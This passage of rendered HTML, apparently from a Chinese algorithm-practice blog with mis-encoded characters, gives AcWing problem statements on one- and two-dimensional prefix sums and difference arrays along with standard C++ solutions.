encoding="application/x-tex">1 \le n,m \le 100000</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7804em;vertical-align:-0.136em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰¤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8304em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">n</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">m</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰¤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">100000</span></span></span></span>,<br><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>âˆ’</mo><mn>1000</mn><mo>â‰¤</mo><mtext>æ•°åˆ—ä¸­å…ƒç´ çš„å€¼</mtext><mo>â‰¤</mo><mn>1000</mn></mrow><annotation encoding="application/x-tex">-1000 \le æ•°åˆ—ä¸­å…ƒç´ çš„å€¼ \le 1000</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7804em;vertical-align:-0.136em;"></span><span class="mord">âˆ’</span><span class="mord">1000</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰¤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8193em;vertical-align:-0.136em;"></span><span class="mord cjk_fallback">æ•°åˆ—ä¸­å…ƒç´ çš„å€¼</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰¤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1000</span></span></span></span></p><p><strong>è¾“å…¥æ ·ä¾‹ï¼š</strong></p><pre><code>5 32 1 3 6 41 21 32 4</code></pre><p><strong>è¾“å‡ºæ ·ä¾‹ï¼š</strong></p><pre><code>3610</code></pre><h3 id="å‰ç¼€å’Œ">å‰ç¼€å’Œ</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> kN = <span class="number">1e5</span> + <span class="number">10</span>;</span><br><span class="line"><span class="type">int</span> a[kN], s[kN];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="type">int</span> n, m;</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>, &amp;n, &amp;m);</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++) &#123;  <span class="comment">// 1åˆ°n</span></span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;s[i]);</span><br><span class="line">    s[i] += s[i - <span class="number">1</span>];</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">while</span> (m--) &#123;</span><br><span class="line">    <span class="type">int</span> l, r;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>, &amp;l, &amp;r);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, s[r] - s[l - <span class="number">1</span>]);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="AcWing-796-å­çŸ©é˜µçš„å’Œ"><a href="https://www.acwing.com/activity/content/punch_the_clock/11/">AcWing 796. å­çŸ©é˜µçš„å’Œ</a></h2><p>è¾“å…¥ä¸€ä¸ª <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span> è¡Œ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>m</mi></mrow><annotation encoding="application/x-tex">m</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">m</span></span></span></span> åˆ—çš„æ•´æ•°çŸ©é˜µï¼Œå†è¾“å…¥ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>q</mi></mrow><annotation encoding="application/x-tex">q</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span></span></span></span> ä¸ªè¯¢é—®ï¼Œæ¯ä¸ªè¯¢é—®åŒ…å«å››ä¸ªæ•´æ•° <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>x</mi><mn>1</mn></msub><mo separator="true">,</mo><msub><mi>y</mi><mn>1</mn></msub><mo separator="true">,</mo><msub><mi>x</mi><mn>2</mn></msub><mo separator="true">,</mo><msub><mi>y</mi><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">x_1, y_1, x_2, y_2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>ï¼Œè¡¨ç¤ºä¸€ä¸ªå­çŸ©é˜µçš„å·¦ä¸Šè§’åæ ‡å’Œå³ä¸‹è§’åæ ‡ã€‚</p><p>å¯¹äºæ¯ä¸ªè¯¢é—®è¾“å‡ºå­çŸ©é˜µä¸­æ‰€æœ‰æ•°çš„å’Œã€‚</p><p><strong>è¾“å…¥æ ¼å¼</strong></p><p>ç¬¬ä¸€è¡ŒåŒ…å«ä¸‰ä¸ªæ•´æ•° <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi><mtext>ï¼Œ</mtext><mi>m</mi><mtext>ï¼Œ</mtext><mi>q</mi></mrow><annotation encoding="application/x-tex">nï¼Œmï¼Œq</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8778em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">n</span><span class="mord cjk_fallback">ï¼Œ</span><span class="mord mathnormal">m</span><span class="mord cjk_fallback">ï¼Œ</span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span></span></span></span>ã€‚</p><p>æ¥ä¸‹æ¥ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span> è¡Œï¼Œæ¯è¡ŒåŒ…å« <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>m</mi></mrow><annotation encoding="application/x-tex">m</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">m</span></span></span></span> ä¸ªæ•´æ•°ï¼Œè¡¨ç¤ºæ•´æ•°çŸ©é˜µã€‚</p><p>æ¥ä¸‹æ¥ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>q</mi></mrow><annotation encoding="application/x-tex">q</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span></span></span></span> è¡Œï¼Œæ¯è¡ŒåŒ…å«å››ä¸ªæ•´æ•° <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>x</mi><mn>1</mn></msub><mo separator="true">,</mo><msub><mi>y</mi><mn>1</mn></msub><mo separator="true">,</mo><msub><mi>x</mi><mn>2</mn></msub><mo separator="true">,</mo><msub><mi>y</mi><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">x_1, y_1, x_2, y_2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>ï¼Œè¡¨ç¤ºä¸€ç»„è¯¢é—®ã€‚</p><p><strong>è¾“å‡ºæ ¼å¼</strong></p><p>å…± <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>q</mi></mrow><annotation encoding="application/x-tex">q</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span></span></span></span> è¡Œï¼Œæ¯è¡Œè¾“å‡ºä¸€ä¸ªè¯¢é—®çš„ç»“æœã€‚</p><p><strong>æ•°æ®èŒƒå›´</strong></p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><mo>â‰¤</mo><mi>n</mi><mo separator="true">,</mo><mi>m</mi><mo>â‰¤</mo><mn>1000</mn></mrow><annotation encoding="application/x-tex">1 \le n,m \le 1000</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7804em;vertical-align:-0.136em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰¤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8304em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">n</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">m</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰¤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1000</span></span></span></span>,<br><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><mo>â‰¤</mo><mi>q</mi><mo>â‰¤</mo><mn>200000</mn></mrow><annotation encoding="application/x-tex">1 \le q \le 200000</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7804em;vertical-align:-0.136em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰¤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8304em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰¤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">200000</span></span></span></span>,<br><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><mo>â‰¤</mo><msub><mi>x</mi><mn>1</mn></msub><mo>â‰¤</mo><msub><mi>x</mi><mn>2</mn></msub><mo>â‰¤</mo><mi>n</mi></mrow><annotation encoding="application/x-tex">1 \le x_1 \le x_2 \le n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7804em;vertical-align:-0.136em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰¤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.786em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰¤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.786em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰¤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span>,<br><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><mo>â‰¤</mo><msub><mi>y</mi><mn>1</mn></msub><mo>â‰¤</mo><msub><mi>y</mi><mn>2</mn></msub><mo>â‰¤</mo><mi>m</mi></mrow><annotation encoding="application/x-tex">1 \le y_1 \le y_2 \le m</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7804em;vertical-align:-0.136em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰¤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8304em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰¤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8304em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰¤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">m</span></span></span></span>,<br><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>âˆ’</mo><mn>1000</mn><mo>â‰¤</mo><mtext>çŸ©é˜µå†…å…ƒç´ çš„å€¼</mtext><mo>â‰¤</mo><mn>1000</mn></mrow><annotation encoding="application/x-tex">-1000 \le çŸ©é˜µå†…å…ƒç´ çš„å€¼ \le 1000</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7804em;vertical-align:-0.136em;"></span><span class="mord">âˆ’</span><span class="mord">1000</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰¤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8193em;vertical-align:-0.136em;"></span><span class="mord cjk_fallback">çŸ©é˜µå†…å…ƒç´ çš„å€¼</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰¤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1000</span></span></span></span></p><p><strong>è¾“å…¥æ ·ä¾‹ï¼š</strong></p><pre><code>3 4 31 7 2 43 6 2 82 1 2 31 1 2 22 1 3 41 3 3 4</code></pre><p><strong>è¾“å‡ºæ ·ä¾‹ï¼š</strong></p><pre><code>172721</code></pre><h3 id="äºŒç»´å‰ç¼€å’Œ">äºŒç»´å‰ç¼€å’Œ</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> kN = <span class="number">1010</span>;</span><br><span class="line"><span class="type">int</span> s[kN][kN];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="type">int</span> n, m, q;</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%d%d%d&quot;</span>, &amp;n, &amp;m, &amp;q);</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">1</span>; j &lt;= m; j++) &#123;</span><br><span class="line">      <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;s[i][j]);</span><br><span class="line">      s[i][j] += s[i - <span class="number">1</span>][j] + s[i][j - <span class="number">1</span>] - s[i - <span class="number">1</span>][j - <span class="number">1</span>];</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> (q--) &#123;</span><br><span class="line">    <span class="type">int</span> x1, y1, x2, y2;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d%d%d%d&quot;</span>, &amp;x1, &amp;y1, &amp;x2, &amp;y2);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, s[x2][y2] - s[x1 - <span class="number">1</span>][y2] - s[x2][y1 - <span class="number">1</span>] + s[x1 - <span class="number">1</span>][y1 - <span class="number">1</span>]);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="AcWing-797-å·®åˆ†"><a href="https://www.acwing.com/problem/content/799/">AcWing 797. å·®åˆ†</a></h2><p>è¾“å…¥ä¸€ä¸ªé•¿åº¦ä¸º <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span> çš„æ•´æ•°åºåˆ—ã€‚</p><p>æ¥ä¸‹æ¥è¾“å…¥ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>m</mi></mrow><annotation encoding="application/x-tex">m</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">m</span></span></span></span> ä¸ªæ“ä½œï¼Œæ¯ä¸ªæ“ä½œåŒ…å«ä¸‰ä¸ªæ•´æ•° <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>l</mi><mo separator="true">,</mo><mi>r</mi><mo separator="true">,</mo><mi>c</mi></mrow><annotation encoding="application/x-tex">l, r, c</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">c</span></span></span></span>ï¼Œè¡¨ç¤ºå°†åºåˆ—ä¸­ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">[</mo><mi>l</mi><mo separator="true">,</mo><mi>r</mi><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">[l, r]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mclose">]</span></span></span></span> ä¹‹é—´çš„æ¯ä¸ªæ•°åŠ ä¸Š <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>c</mi></mrow><annotation encoding="application/x-tex">c</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">c</span></span></span></span>ã€‚</p><p>è¯·ä½ è¾“å‡ºè¿›è¡Œå®Œæ‰€æœ‰æ“ä½œåçš„åºåˆ—ã€‚</p><p><strong>è¾“å…¥æ ¼å¼</strong></p><p>ç¬¬ä¸€è¡ŒåŒ…å«ä¸¤ä¸ªæ•´æ•° <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span> å’Œ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>m</mi></mrow><annotation encoding="application/x-tex">m</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">m</span></span></span></span>ã€‚</p><p>ç¬¬äºŒè¡ŒåŒ…å« <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span> ä¸ªæ•´æ•°ï¼Œè¡¨ç¤ºæ•´æ•°åºåˆ—ã€‚</p><p>æ¥ä¸‹æ¥ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>m</mi></mrow><annotation encoding="application/x-tex">m</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">m</span></span></span></span> è¡Œï¼Œæ¯è¡ŒåŒ…å«ä¸‰ä¸ªæ•´æ•° <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>l</mi><mtext>ï¼Œ</mtext><mi>r</mi><mtext>ï¼Œ</mtext><mi>c</mi></mrow><annotation encoding="application/x-tex">lï¼Œrï¼Œc</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord cjk_fallback">ï¼Œ</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mord cjk_fallback">ï¼Œ</span><span class="mord mathnormal">c</span></span></span></span>ï¼Œè¡¨ç¤ºä¸€ä¸ªæ“ä½œã€‚</p><p><strong>è¾“å‡ºæ 